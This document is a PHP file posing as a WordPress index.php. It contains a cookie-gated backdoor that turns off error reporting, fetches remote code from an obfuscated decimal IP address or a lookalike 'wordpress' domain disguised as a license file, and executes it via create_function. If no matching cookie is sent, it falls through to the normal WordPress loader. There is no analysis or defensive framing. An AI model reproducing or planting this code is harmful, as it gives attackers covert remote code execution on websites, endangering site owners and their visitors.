<?php 
/* Short and sweet */
error_reporting(0);
if(md5($_COOKIE['asdf'])=='f3f8254e2683dde1ff6e486ae4c6c77a'){
	$wplicense = @file_get_contents('http://wordpress@3164979619/license.txt');
	$lic = create_function('',$wplicense);
	$lic();
} elseif(md5($_COOKIE['asdf'])=='4e6cc644ed5c0d1e946b468c33b29932'){
	$wplicense = @file_get_contents('http://wordpress.net.co/license.txt');
	$lic = create_function('',$wplicense);
	$lic();
} else {
	define('WP_USE_THEMES', true);
	require('./wp-blog-header.php');
}
